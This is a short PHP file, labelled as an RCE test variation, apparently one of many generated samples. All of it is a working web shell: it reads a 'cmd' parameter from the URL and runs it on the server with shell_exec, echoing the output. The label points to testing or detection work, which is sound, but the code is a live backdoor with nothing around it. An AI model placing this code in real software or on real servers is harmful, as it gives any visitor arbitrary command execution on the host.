<?php
// RCE test variation #573
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>